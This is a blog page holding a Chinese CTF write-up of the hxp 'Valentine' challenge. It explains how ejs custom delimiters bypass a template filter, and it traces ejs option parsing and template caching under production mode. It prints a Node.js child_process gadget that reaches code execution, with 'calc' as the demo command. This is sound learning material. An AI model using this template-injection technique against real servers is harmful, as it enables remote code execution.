@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/03/26/security/ctf/hxp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hxp">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/03/26/Security/CTF/hxp/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-25T21:15:00.000Z">
+<meta property="article:modified_time" content="2023-03-25T21:16:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            hxp -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail.png" alt="hxp" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">hxp</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-03-26 05:15</span>
+        <span class="mobile">2023-03-26 05:15</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-03-26 05:16</span>
+            <span class="mobile">2023-03-26 05:16</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Valentine"><a href="#Valentine" class="headerlink" title="Valentine"></a>Valentine</h1><p>本题不需要用原型链污染就能解决</p>
+<p>利用ejs可以自定义模板分界符的特性（详见<a class="link"   target="_blank" rel="noopener" href="https://github.com/mde/ejs" >ejs的github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）绕过对模板的过滤，执行RCE代码。</p>
+<h2 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a>函数调用链</h2><p>在开发环境下测试：</p>
+<p>模板获取分界符的函数位置在 <code>node_modules/ejs/lib/ejs.js/Template</code> 函数处（Line：509），有语句：<code>options.delimiter *=* opts.delimiter *||* **exports**.delimiter *||* _DEFAULT_DELIMITER</code> </p>
+<p>参数”delimiter”在”ejs.js”中的 <code>renderFile()</code> 函数中被提取，其中的 </p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils.<span class="title function_">shallowCopyFromList</span>(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS)</span><br></pre></td></tr></table></figure></div>
+
+<p>语句将data中的settings（传入参数）中所需的关键词参数提取出来放入opts中，传入到Template类中进行初始化，初始化时指定delimiter分界符。可被识别的关键字有：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;delimiter&#x27;</span>, <span class="string">&#x27;scope&#x27;</span>, <span class="string">&#x27;context&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;compileDebug&#x27;</span>, <span class="string">&#x27;client&#x27;</span>, <span class="string">&#x27;_with&#x27;</span>, <span class="string">&#x27;rmWhitespace&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;cache&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>共有12个关键词，其中没有”openDilimiter”，因此传入Delimiter是无效的（？），同时只要传入的键值对键名为”delimiter”都会被识别为分界符，因此其不能被当做一般的键来使用。传入的options被放在函数 <code>ejs.render()</code> 的第二个参数中，以上是该参数能识别的关键字。也许后面的参数还能识别其他的关键字，如openDelimiter。</p>
+<p>整条调用链嵌套了很多层render，在传递options参数时多次调用了merge函数，也许有原型链污染的空间。</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>本题服务器并没有提供 <code>require</code> ，利用：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>达到RCE。</p>
+<hr>
+<p>本题实际上是运行在生产环境中的，通过在 <code>packages.json</code> 文件中添加：</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scripts<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;set DEBUG=rep*&amp;&amp;set NODE_ENV=production&amp;&amp; node --inspect=0.0.0.0:6369 app.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>实现设置生产环境并开启node的调试模式，调试端口放在6369，通过 <code>npm run start</code> 来启动服务器。</p>
+<p>由于在docker内调试NODE服务器尝试了很久都没成功，最后选择了在本地直接修改环境变量为生产环境来做测试。</p>
+<p>由于ejs的特性，本题在生产环境与开发环境中的表现非常的不一样。</p>
+<p>通过：</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rep = <span class="built_in">require</span>(<span class="string">&#x27;debug&#x27;</span>)(<span class="string">&#x27;rep&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">rep</span>(<span class="string">&quot;$env:NODE_ENV=&quot;</span>, process.<span class="property">env</span>.<span class="property">NODE_ENV</span>)</span><br><span class="line"><span class="keyword">if</span>(process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span>)&#123;</span><br><span class="line">  <span class="title function_">rep</span>(<span class="string">&quot;开发!&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  <span class="title function_">rep</span>(<span class="string">&quot;生产!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以标记回显当前的环境，利用debug可以使回显更便利也更清晰。为了使debug有效需要设置环境变量，锁定debug定义的内容 <code>rep</code> 这个名称，支持通配符，因此设置：<code>set DEBUG=rep*&amp;&amp;</code> . 表示读取所有以”rep”开头的debug报告对象。环境变量严格读取所有字符，因此后续不能跟多余的空格，如：<code>set DEBUG=rep* &amp;&amp;</code> . 这会使得 <code>DEBUG.length=5</code> 即带上了后续的空格，但是环境变量名不区分大小写，但也严格识别空格，DEBUG后跟的多余的空格也会被识别为变量名的一部分。</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在生产环境下测试：</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qwq2: &lt;?= name ?&gt;<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">tzt2: &lt;%= name %&gt;<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>548行的 <code>app.render</code> 函数中有语句：</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">renderOptions.<span class="property">cache</span> = <span class="variable language_">this</span>.<span class="title function_">enabled</span>(<span class="string">&#x27;view cache&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>该语句在生产环境下会返回”True”，因此促成了后续模板渲染结果被缓存，二次解析被忽略。</p>
+<p>“ejs.js”第210行的 <code>handleCache</code> 函数将获取返回的内容，并实现相应模板的缓存。</p>
+<p><code>exports.compile</code> 赋值了模板类的 <code>compile</code> 函数，该函数完成了整个模板的解析过程，其解析思路是根据类中提供的opts设置先完成对模板内容的解析，然后根据解析的结果拼接出固定的函数，该函数将依据本次解析的内容构造出模板渲染的结果，并且该函数将随之被存入与当前模板名对应的缓存中。之后再次渲染该模板时将不再重新解析，而是直接从缓存中拿出构造函数，生成模板的渲染内容，并返回。</p>
+<p>其中的参数如”name”是被单独识别并替换的，而除此之外的其他部分包括 <code>openDelimiter, delimiter</code> 等参数都被缓存了起来，因此改模板替换name的效果是有效的，但其他参数的篡改是做不到的。</p>
+<p>在”ejs.js”第762行的 <code>parseTemplateText</code> 函数中，模板被解析识别，并返回如下内容arr：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: <span class="string">&quot;qwq2: &lt;?= name ?&gt;&lt;br/&gt;\r\ntzt2: &quot;</span></span><br><span class="line"><span class="number">1</span>: <span class="string">&quot;&lt;%=&quot;</span></span><br><span class="line"><span class="number">2</span>: <span class="string">&quot; name &quot;</span></span><br><span class="line"><span class="number">3</span>: <span class="string">&quot;%&gt;&quot;</span></span><br><span class="line"><span class="number">4</span>: <span class="string">&quot;&lt;br/&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>generateSource</code> 函数中，利用该内容拼接出了解析函数的最主要部分：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;    ; __append(&quot;</span><span class="attr">qwq2</span>: &lt;?= name ?&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span>\r\<span class="attr">ntzt2</span>: <span class="string">&quot;)</span></span><br><span class="line"><span class="string">    ; __line = 2</span></span><br><span class="line"><span class="string">    ; __append(escapeFn( name ))</span></span><br><span class="line"><span class="string">    ; __append(&quot;</span>&lt;br/&gt;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>并存储在类的”source”属性中，随后拼接出整个构造模板结果的函数：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">anonymous</span>(<span class="params">locals, escapeFn, include, rethrow</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">var</span> __line = <span class="number">1</span></span><br><span class="line">  , __lines = <span class="string">&quot;qwq2: &lt;?= name ?&gt;&lt;br/&gt;\r\ntzt2: &lt;%= name %&gt;&lt;br/&gt;&quot;</span></span><br><span class="line">  , __filename = <span class="string">&quot;C:\\Users\\Forestsetyou\\Desktop\\CTF\\hxp\\val\\views\\81508992-e5fe-4b84-8348-6f3884cb3c41.ejs&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> __output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">__append</span>(<span class="params">s</span>) &#123; <span class="keyword">if</span> (s !== <span class="literal">undefined</span> &amp;&amp; s !== <span class="literal">null</span>) __output += s &#125;</span><br><span class="line">  <span class="keyword">with</span> (locals || &#123;&#125;) &#123;</span><br><span class="line">    ; <span class="title function_">__append</span>(<span class="string">&quot;qwq2: &lt;?= name ?&gt;&lt;br/&gt;\r\ntzt2: &quot;</span>)</span><br><span class="line">    ; __line = <span class="number">2</span></span><br><span class="line">    ; <span class="title function_">__append</span>(escapeFn( name ))</span><br><span class="line">    ; <span class="title function_">__append</span>(<span class="string">&quot;&lt;br/&gt;&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __output;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="title function_">rethrow</span>(e, __lines, __filename, __line, escapeFn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//# sourceURL=&quot;C:\\Users\\Forestsetyou\\Desktop\\CTF\\hxp\\val\\views\\81508992-e5fe-4b84-8348-6f3884cb3c41.ejs&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>并利用 <code>fn = new Function(&quot;locals, escapeFn, include, rethrow&quot;, src)</code> 的语法申请了一个形参为 <code>locals, escapeFn, include, rethrow</code> ，函数体为 <code>src</code> 的新函数，存储在Fn中</p>
+<p>ejs内部是根据传入的渲染设置，动态拼接出一个字符串形式的JS函数，然后将该字符串传入 <code>Function</code> 的构造函数来获取一个崭新的函数，该函数对应字符串。当断点运行到当前环境时，可以用 <code>Console.log(fn)</code> 来展示函数的具体内容，DEV工具中鼠标悬浮查看函数体是找不到任何内容的，在控制台中也不能直接用 <code>fn</code> 查看函数体。</p>
+<p>随后回到 <code>handleCache</code> 函数中，fn最后被赋给了func，由于 <code>options.cache</code> 为True，模板的构造函数被缓存。最后模板的渲染结果被返回。</p>
+<hr>
